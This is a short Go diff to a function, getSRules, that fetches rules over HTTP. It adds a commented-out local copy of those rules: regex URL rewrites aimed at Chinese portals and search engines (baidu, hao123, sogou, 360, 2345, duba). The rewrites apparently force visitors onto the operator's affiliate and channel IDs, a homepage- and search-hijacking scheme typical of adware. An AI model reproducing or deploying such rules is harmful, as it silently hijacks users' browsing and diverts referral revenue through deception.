@@ -13,6 +13,11 @@ import (
 )
 
 func getSRules(srcurl string) ([]byte, error) {
+
+	//localdata := []byte(`{"local":false,"srules":[{"compilers":[{"type":1,"host":"www.iehome.com","match":["s@^(http[s]?)://www.iehome.com/.*$@http://www.2345.com/?kd00592p@i"]}]},{"compilers":[{"type":1,"host":"hao.360.cn","match":["s@^(http[s]?)://hao.360.cn/*/\\?______.*$@$1://hao.360.cn/?src=lm&ls=n6e7c24959a@i"]},{"type":1,"host":"www.2345.com","match":["s@^(http[s]?)://www.2345.com/*/\\?.*$@$1://www.2345.com/?kd00592p@i"]},{"type":1,"host":"www.duba.com","match":["s@^(http[s]?)://www.duba.com/*/\\?______.*$@$1://www.duba.com/?un_376755_70@i"]},{"type":1,"host":"www.hao123.com","match":["s@^(http[s]?)://www.hao123.com/*/\\?______.*$@$1://www.hao123.com/?tn=13087099_4_hao_pg@i"]},{"type":1,"host":"www.baidu.com","match":["s@^(http[s]?)://www.baidu.com/*/s\\?______(?:(.*)&)?(?:tn=[^&]*)(.*)$@$1://www.baidu.com/s?$2&tn=13087099_4_hao_pg$3@i"]}]},{"compilers":[{"type":1,"host":"www.sogou.com","match":["s@^(http[s]?)://www.sogou.com/*/index\\.(?:php|html|htm)\\?.*$@$1://www.sogou.com/index.htm?pid=sogou-netb-3be0214185d6177a-4012@i"]},{"type":1,"host":"www.sogou.com","match":["s@^(http[s]?)://www.sogou.com/*/sogou\\?(?:(.*)&)?(?:pid=[^&]*)(.*)$@$1://www.sogou.com/sogou?$1&pid=sogou-netb-3be0214185d6177a-4012$2@i"]}]},{"compilers":[{"type":1,"host":"123.sogou.com","match":["s@^(http[s]?)://123.sogou.com/*/\\?——.*$@$1://123.sogou.com/?71029-8484@i"]},{"type":1,"host":"www.sogou.com","match":["s@^(http[s]?)://www.sogou.com/*/sie\\?——(?:(.*)&)?(?:hdq=[^&]*)(.*)$@$1://www.sogou.com/sie?$2&hdq=Af71029-8484$3@i"]}]}]}`)
+
+	//return localdata, nil
+
 	resp, err := http.Get(srcurl)
 
 	if nil != err {
